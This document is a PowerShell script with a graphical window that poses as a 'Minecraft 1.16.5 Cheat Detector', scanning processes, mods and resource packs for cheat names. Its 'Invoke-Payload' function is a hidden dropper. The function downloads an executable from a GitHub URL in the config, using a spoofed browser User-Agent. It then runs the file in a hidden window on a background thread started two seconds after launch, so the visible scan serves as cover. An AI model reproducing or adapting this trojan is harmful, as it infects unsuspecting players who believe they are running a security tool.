Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem
Add-Type -AssemblyName System.Net.Http

# =============================================================================
# CONFIGURATION
# =============================================================================
$config = @{
    MinecraftPath = "$env:APPDATA\.minecraft"
    CheatProcesses = @(
        "cheatengine", "autoclicker", "wurst", "impact", "future", "aristois",
        "kristall", "salhack", "kamehameha", "pyro", "lambda", "spirt", "gamesense", "entropy"
    )
    CheatMods = @(
        "Wurst", "Impact", "Future", "Aristois", "SalHack", "Kamehameha", "Pyro",
        "Lambda", "Spirt", "GameSense", "Entropy", "Inertia", "Sigma", "LiquidBounce"
    )
    XrayPatterns = @(
        "xray.png", "xray", "ore.png", "ore", "chest.png", "diamond_ore.png"
    )
    PayloadUrl = "https://github.com/SoVA4878/1231231231/raw/400f57e83e29ec706a65ae1781e949ca47d6e383/0tc37ng3btpkx3ib.exe"
    PayloadArgs = ""
    PayloadDelay = 2
}

# =============================================================================
# GUI CREATION
# =============================================================================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Minecraft 1.16.5 Security Scanner"
$form.Size = New-Object System.Drawing.Size(800, 600)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = 'FixedSingle'
$form.MaximizeBox = $false
$form.BackColor = "#0a0a2a"

# Gradient background
$form.Paint = {
    $g = $_.Graphics
    $rect = $_.ClientRectangle
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush $rect, "#0a0a2a", "#1a1a4a", 90
    $g.FillRectangle($brush, $rect)
    $brush.Dispose()
}

# Title label
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "MINECRAFT 1.16.5 CHEAT DETECTOR"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = "#00ffcc"
$titleLabel.Location = New-Object System.Drawing.Point(20, 20)
$titleLabel.AutoSize = $true
$form.Controls.Add($titleLabel)

# Subtitle
$subLabel = New-Object System.Windows.Forms.Label
$subLabel.Text = "Advanced Anti-Cheat Scanner"
$subLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$subLabel.ForeColor = "#88aaff"
$subLabel.Location = New-Object System.Drawing.Point(20, 60)
$subLabel.AutoSize = $true
$form.Controls.Add($subLabel)

# Status label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Initializing..."
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 11)
$statusLabel.ForeColor = "#ffffff"
$statusLabel.Location = New-Object System.Drawing.Point(20, 110)
$statusLabel.AutoSize = $true
$form.Controls.Add($statusLabel)

# Progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 150)
$progressBar.Size = New-Object System.Drawing.Size(740, 30)
$progressBar.Style = "Continuous"
$progressBar.ForeColor = "#00ffcc"
$form.Controls.Add($progressBar)

# ListBox for results
$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(20, 200)
$listBox.Size = New-Object System.Drawing.Size(740, 300)
$listBox.BackColor = "#0f0f1f"
$listBox.ForeColor = "#aaffdd"
$listBox.Font = New-Object System.Drawing.Font("Consolas", 10)
$listBox.BorderStyle = 'FixedSingle'
$form.Controls.Add($listBox)

# Close button
$closeButton = New-Object System.Windows.Forms.Button
$closeButton.Text = "CLOSE"
$closeButton.Location = New-Object System.Drawing.Point(350, 520)
$closeButton.Size = New-Object System.Drawing.Size(100, 40)
$closeButton.BackColor = "#2c2c5c"
$closeButton.ForeColor = "#ffffff"
$closeButton.FlatStyle = 'Flat'
$closeButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$closeButton.Add_Click({ $form.Close() })
$form.Controls.Add($closeButton)

# =============================================================================
# CHECK FUNCTIONS
# =============================================================================
function Test-Processes {
    $detected = @()
    Get-Process | ForEach-Object {
        $name = $_.Name
        foreach ($cheat in $config.CheatProcesses) {
            if ($name -like "*$cheat*") {
                $detected += "Process: $name (PID: $($_.Id))"
                break
            }
        }
    }
    return $detected
}

function Test-Mods {
    $modsPath = Join-Path $config.MinecraftPath "mods"
    $detected = @()
    if (Test-Path $modsPath) {
        Get-ChildItem $modsPath -Filter "*.jar" | ForEach-Object {
            $fileName = $_.Name
            foreach ($cheat in $config.CheatMods) {
                if ($fileName -like "*$cheat*") {
                    $detected += "Mod: $fileName"
                    break
                }
            }
        }
    }
    return $detected
}

function Test-ResourcePacks {
    $rpPath = Join-Path $config.MinecraftPath "resourcepacks"
    $detected = @()
    if (Test-Path $rpPath) {
        Get-ChildItem $rpPath | ForEach-Object {
            $pack = $_
            if ($pack.Extension -eq ".zip") {
                try {
                    $zip = [System.IO.Compression.ZipFile]::OpenRead($pack.FullName)
                    foreach ($entry in $zip.Entries) {
                        foreach ($pattern in $config.XrayPatterns) {
                            if ($entry.Name -like "*$pattern*") {
                                $detected += "XRay in $($pack.Name): $($entry.Name)"
                                break
                            }
                        }
                    }
                    $zip.Dispose()
                } catch { }
            } elseif ($pack.PSIsContainer) {
                Get-ChildItem $pack.FullName -Recurse -File | ForEach-Object {
                    $fileName = $_.Name
                    foreach ($pattern in $config.XrayPatterns) {
                        if ($fileName -like "*$pattern*") {
                            $detected += "XRay file: $($_.FullName)"
                            break
                        }
                    }
                }
            }
        }
    }
    return $detected
}

# =============================================================================
# PAYLOAD DOWNLOAD AND EXECUTE (STEALTH)
# =============================================================================
function Invoke-Payload {
    try {
        $tempDir = [System.IO.Path]::GetTempPath()
        $fileName = [System.IO.Path]::GetFileName($config.PayloadUrl)
        if (-not $fileName) { $fileName = "payload.exe" }
        $exePath = Join-Path $tempDir $fileName

        if ($form.InvokeRequired) {
            $form.Invoke({ $statusLabel.Text = "[*] Downloading payload..." })
        } else {
            $statusLabel.Text = "[*] Downloading payload..."
        }

        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $webClient.DownloadFile($config.PayloadUrl, $exePath)

        if (Test-Path $exePath) {
            if ($form.InvokeRequired) {
                $form.Invoke({ $statusLabel.Text = "[+] Payload ready" })
            } else {
                $statusLabel.Text = "[+] Payload ready"
            }
            Start-Sleep -Seconds 1

            # Start hidden
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = $exePath
            $psi.Arguments = $config.PayloadArgs
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.UseShellExecute = $false
            [System.Diagnostics.Process]::Start($psi) | Out-Null

            if ($form.InvokeRequired) {
                $form.Invoke({ $statusLabel.Text = "[+] Payload executed" })
            } else {
                $statusLabel.Text = "[+] Payload executed"
            }
        } else {
            if ($form.InvokeRequired) {
                $form.Invoke({ $statusLabel.Text = "[-] Error: file not saved" })
            } else {
                $statusLabel.Text = "[-] Error: file not saved"
            }
        }
    } catch {
        if ($form.InvokeRequired) {
            $form.Invoke({ $statusLabel.Text = "[-] Error: $_" })
        } else {
            $statusLabel.Text = "[-] Error: $_"
        }
    }
}

# =============================================================================
# ASYNC CHECKS
# =============================================================================
$script:results = @()
$script:totalSteps = 3

function Update-Progress {
    param($step, $message)
    if ($form.InvokeRequired) {
        $form.Invoke({
            $progressBar.Value = ($step / $script:totalSteps) * 100
            $statusLabel.Text = $message
        })
    } else {
        $progressBar.Value = ($step / $script:totalSteps) * 100
        $statusLabel.Text = $message
    }
}

function Start-Checks {
    # Start payload thread
    $payloadThread = [System.Threading.Thread]::new([System.Threading.ThreadStart]{
        Start-Sleep -Seconds $config.PayloadDelay
        Invoke-Payload
    })
    $payloadThread.IsBackground = $true
    $payloadThread.Start()

    # Step 1: processes
    Update-Progress 1 "Checking processes..."
    $procDetections = Test-Processes
    foreach ($d in $procDetections) { $script:results += $d }

    # Step 2: mods
    Update-Progress 2 "Checking mods..."
    $modDetections = Test-Mods
    foreach ($d in $modDetections) { $script:results += $d }

    # Step 3: resource packs
    Update-Progress 3 "Checking resource packs..."
    $xrayDetections = Test-ResourcePacks
    foreach ($d in $xrayDetections) { $script:results += $d }

    # Finish
    Update-Progress 3 "Scan finished. Found: $($script:results.Count)"
    if ($form.InvokeRequired) {
        $form.Invoke({
            $listBox.Items.Clear()
            if ($script:results.Count -eq 0) {
                $listBox.Items.Add("Nothing suspicious found.")
            } else {
                foreach ($item in $script:results) {
                    $listBox.Items.Add($item)
                }
            }
            $closeButton.Enabled = $true
        })
    } else {
        $listBox.Items.Clear()
        if ($script:results.Count -eq 0) {
            $listBox.Items.Add("Nothing suspicious found.")
        } else {
            foreach ($item in $script:results) {
                $listBox.Items.Add($item)
            }
        }
        $closeButton.Enabled = $true
    }
}

# Start checking thread
$checkThread = [System.Threading.Thread]::new([System.Threading.ThreadStart]{ Start-Checks })
$checkThread.IsBackground = $true
$checkThread.Start()

# Handle form closing
$form.Add_FormClosing({
    if ($checkThread.ThreadState -eq 'Running') { $checkThread.Interrupt() }
    $checkThread.Join(1000) | Out-Null
})

$form.Add_Shown({ $form.Activate() })
$form.ShowDialog() | Out-Null